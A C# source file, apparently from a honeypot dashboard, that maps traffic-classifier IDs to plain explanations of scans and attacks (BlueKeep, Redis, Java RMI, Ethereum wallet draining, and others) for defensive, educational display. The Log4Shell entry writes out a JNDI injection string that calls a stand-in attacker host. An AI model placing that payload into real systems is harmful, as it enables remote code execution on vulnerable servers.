namespace SlurpJob.Classification;

/// <summary>
/// Static catalog of attack information for educational display.
/// Maps classifier IDs to human-readable explanations.
/// </summary>
public static class AttackCatalog
{
    private static readonly Dictionary<string, AttackInfo> _catalog = new(StringComparer.OrdinalIgnoreCase);
    
    // Fallback entries for protocol-level explanations
    private static readonly Dictionary<string, AttackInfo> _protocolFallbacks = new(StringComparer.OrdinalIgnoreCase);

    static AttackCatalog()
    {
        // === RDP Attacks ===
        Register(new AttackInfo
        {
            Id = "rdp-bluekeep",
            Title = "BlueKeep Exploit (CVE-2019-0708)",
            WhatIsIt = "This bot is probing for the BlueKeep vulnerability, a critical flaw in Windows Remote Desktop that allows remote code execution without authentication.",
            Impact = "If successful, the attacker gains complete control of the target system—installing malware, stealing data, or using it as a launching point for further attacks.",
            TechnicalNote = "BlueKeep affects Windows 7, Server 2008, and earlier. It's 'wormable'—meaning it can spread automatically between vulnerable machines.",
            References = ["https://nvd.nist.gov/vuln/detail/CVE-2019-0708", "https://attack.mitre.org/techniques/T1210/"]
        });
        
        Register(new AttackInfo
        {
            Id = "rdp-scanning",
            Title = "RDP Service Scanning",
            WhatIsIt = "This bot is checking if Remote Desktop Protocol (RDP) is running on this port, typically as a precursor to brute-force login attempts or exploit delivery.",
            Impact = "RDP exposure is a top attack vector. Successful access means full remote control of the target machine.",
            References = ["https://attack.mitre.org/techniques/T1021/001/"]
        });

        // === SSH ===
        Register(new AttackInfo
        {
            Id = "ssh-scanning",
            Title = "SSH Service Scanning",
            WhatIsIt = "This bot is probing for SSH (Secure Shell) services, collecting version information to find systems vulnerable to known exploits or weak credentials.",
            Impact = "SSH access provides command-line control of Linux/Unix servers. Attackers use this for cryptomining, data theft, or pivoting deeper into networks.",
            References = ["https://attack.mitre.org/techniques/T1021/004/"]
        });

        // === TLS ===
        Register(new AttackInfo
        {
            Id = "tls-scanning",
            Title = "TLS/SSL Handshake Probe",
            WhatIsIt = "This bot is initiating a TLS handshake to discover what encrypted services are running and potentially identify vulnerable SSL/TLS configurations.",
            Impact = "Information gathering for later attacks. Weak TLS configurations can enable man-in-the-middle attacks or data interception.",
            References = ["https://attack.mitre.org/techniques/T1190/"]
        });

        // === Ethereum / JSON-RPC ===
        Register(new AttackInfo
        {
            Id = "ethereum-node-probe",
            Title = "Ethereum Node Scanning",
            WhatIsIt = "This bot is searching for exposed Ethereum JSON-RPC interfaces, which can reveal wallet balances and blockchain data.",
            Impact = "Information disclosure. Exposed nodes may leak wallet addresses and transaction history.",
            References = ["https://ethereum.org/en/developers/docs/apis/json-rpc/"]
        });
        
        Register(new AttackInfo
        {
            Id = "ethereum-wallet-drain",
            Title = "Ethereum Wallet Attack",
            WhatIsIt = "This bot is attempting to unlock accounts or send transactions through an exposed Ethereum node, trying to steal cryptocurrency.",
            Impact = "Direct financial theft. Attackers can drain wallets and transfer funds to their own addresses.",
            TechnicalNote = "Methods like personal_unlockAccount and eth_sendTransaction are extremely dangerous when exposed.",
            References = ["https://nvd.nist.gov/vuln/detail/CVE-2017-12581"]
        });

        // === Redis ===
        Register(new AttackInfo
        {
            Id = "redis-exploitation",
            Title = "Redis Database Attack",
            WhatIsIt = "This bot is targeting exposed Redis databases, attempting to execute commands that can write files, steal data, or gain system access.",
            Impact = "Redis exploitation can lead to remote code execution by writing malicious files (SSH keys, cron jobs) to the server.",
            TechnicalNote = "Redis is designed for trusted networks. Internet exposure with no authentication is extremely dangerous.",
            References = ["https://attack.mitre.org/techniques/T1505/"]
        });

        // === Java RMI ===
        Register(new AttackInfo
        {
            Id = "java-rmi",
            Title = "Java RMI Exploitation",
            WhatIsIt = "This bot is probing for Java Remote Method Invocation services, which are frequently vulnerable to deserialization attacks.",
            Impact = "Java deserialization vulnerabilities enable remote code execution—complete system compromise with no authentication required.",
            TechnicalNote = "Tools like ysoserial generate payloads targeting common Java libraries (CommonsCollections, Spring, etc.).",
            References = ["https://attack.mitre.org/techniques/T1190/", "https://github.com/frohoff/ysoserial"]
        });

        // === WebLogic T3 ===
        Register(new AttackInfo
        {
            Id = "weblogic-t3",
            Title = "Oracle WebLogic T3 Attack",
            WhatIsIt = "This bot is targeting Oracle WebLogic Server's T3 protocol, probing for deserialization vulnerabilities that enable remote code execution.",
            Impact = "Critical vulnerabilities in WebLogic (CVE-2019-2725, CVE-2020-14882) allow unauthenticated attackers to execute arbitrary code.",
            References = ["https://nvd.nist.gov/vuln/detail/CVE-2019-2725", "https://nvd.nist.gov/vuln/detail/CVE-2020-14882"]
        });

        // === Log4J ===
        Register(new AttackInfo
        {
            Id = "log4shell",
            Title = "Log4Shell Exploit (CVE-2021-44228)",
            WhatIsIt = "This bot is attempting the Log4Shell attack, one of the most severe vulnerabilities ever discovered. It exploits Java's Log4j library to execute arbitrary code via a simple log message.",
            Impact = "Remote code execution on any system using vulnerable Log4j versions. Estimated to have affected hundreds of millions of devices.",
            TechnicalNote = "The attack works by injecting ${jndi:ldap://attacker.com/path} into any logged field (User-Agent, form input, etc.).",
            References = ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "https://attack.mitre.org/techniques/T1190/"]
        });

        // === SIP ===
        Register(new AttackInfo
        {
            Id = "sip-scanning",
            Title = "VoIP/SIP Enumeration",
            WhatIsIt = "This bot is scanning for SIP (Session Initiation Protocol) services used by VoIP phone systems, looking for systems to exploit for toll fraud or call interception.",
            Impact = "VoIP compromise enables toll fraud (making expensive calls at your expense), eavesdropping on calls, or using your system for spam calls.",
            References = ["https://attack.mitre.org/techniques/T1496/"]
        });

        // === SSDP ===
        Register(new AttackInfo
        {
            Id = "ssdp-discovery",
            Title = "UPnP/SSDP Discovery",
            WhatIsIt = "This bot is using SSDP (Simple Service Discovery Protocol) to find UPnP-enabled devices like routers, IoT devices, and media servers.",
            Impact = "UPnP vulnerabilities can allow attackers to reconfigure routers, open firewall ports, or exploit smart home devices.",
            References = ["https://attack.mitre.org/techniques/T1557/"]
        });

        // === Config Probing ===
        Register(new AttackInfo
        {
            Id = "config-probe",
            Title = "Configuration File Probe",
            WhatIsIt = "This bot is attempting to access sensitive configuration files like .env, .git/config, or wp-config.php that often contain database credentials and API keys.",
            Impact = "Exposed config files leak credentials, enabling database access, API abuse, or complete application takeover.",
            References = ["https://attack.mitre.org/techniques/T1552/001/"]
        });

        // === HTTP ===
        Register(new AttackInfo
        {
            Id = "http-scanning",
            Title = "HTTP Service Probe",
            WhatIsIt = "This bot is probing for web servers, often checking for specific vulnerabilities, exposed admin panels, or interesting endpoints.",
            Impact = "Web application attacks are the most common entry point for breaches—from SQLi to RCE exploits.",
            References = ["https://attack.mitre.org/techniques/T1190/"]
        });

        Register(new AttackInfo
        {
            Id = "port-scan",
            Title = "Port Scanning",
            WhatIsIt = "This bot connected to the port but sent no data—a basic port scan to discover which services are running.",
            Impact = "Reconnaissance only. The attacker is building a map of your exposed services for future targeted attacks.",
            TechnicalNote = "Port scanning is the first step in almost every attack. Tools like Masscan can scan the entire internet in under an hour.",
            References = ["https://attack.mitre.org/techniques/T1046/"]
        });

        // === Magellan / RIPE Atlas ===
        Register(new AttackInfo
        {
            Id = "magellan-scanner",
            Title = "RIPE Atlas / Magellan Internet Measurement",
            WhatIsIt = "This is a RIPE Atlas measurement probe (codename 'Magellan'). It's a legitimate internet research tool used to measure connectivity and reachability across the global internet.",
            Impact = "Benign. These probes are part of academic and network research infrastructure. No exploitation intended.",
            TechnicalNote = "MGLNDD payloads contain the target IP and port being measured. RIPE Atlas is operated by RIPE NCC for internet health monitoring.",
            References = ["https://atlas.ripe.net/", "https://www.ripe.net/analyse/internet-measurements/ripe-atlas"]
        });

        // === Unknown ===
        Register(new AttackInfo
        {
            Id = "unknown",
            Title = "Unclassified Traffic",
            WhatIsIt = "This traffic doesn't match any known attack pattern yet. It could be a new exploit, custom malware, or benign traffic.",
            Impact = "Unknown. Manual analysis may reveal a new threat worth classifying.",
            TechnicalNote = "If you see patterns in unclassified traffic, it might be worth creating a new classifier for it."
        });

        // === Protocol-level fallbacks ===
        _protocolFallbacks["RDP"] = _catalog["rdp-scanning"];
        _protocolFallbacks["SSH"] = _catalog["ssh-scanning"];
        _protocolFallbacks["TLS"] = _catalog["tls-scanning"];
        _protocolFallbacks["HTTP"] = _catalog["http-scanning"];
        _protocolFallbacks["SIP"] = _catalog["sip-scanning"];
        _protocolFallbacks["SSDP"] = _catalog["ssdp-discovery"];
        _protocolFallbacks["Redis"] = _catalog["redis-exploitation"];
        _protocolFallbacks["JSONRPC"] = _catalog["ethereum-node-probe"];
        _protocolFallbacks["RMI"] = _catalog["java-rmi"];
        _protocolFallbacks["T3"] = _catalog["weblogic-t3"];
        _protocolFallbacks["Magellan"] = _catalog["magellan-scanner"];
    }

    private static void Register(AttackInfo info)
    {
        _catalog[info.Id] = info;
    }

    /// <summary>
    /// Get attack info by classifier ID, with fallback to protocol-level or unknown.
    /// </summary>
    public static AttackInfo Get(string? classifierId, string? protocol = null)
    {
        // Try exact ID match (but not "unknown" - that's the fallback)
        if (!string.IsNullOrEmpty(classifierId) && classifierId != "unknown" && _catalog.TryGetValue(classifierId, out var info))
            return info;
        
        // Try protocol fallback
        if (!string.IsNullOrEmpty(protocol) && _protocolFallbacks.TryGetValue(protocol, out var protoInfo))
            return protoInfo;
        
        // Return unknown
        return _catalog["unknown"];
    }

    /// <summary>
    /// Check if a specific attack ID has catalog entry.
    /// </summary>
    public static bool HasEntry(string classifierId) => _catalog.ContainsKey(classifierId);
}
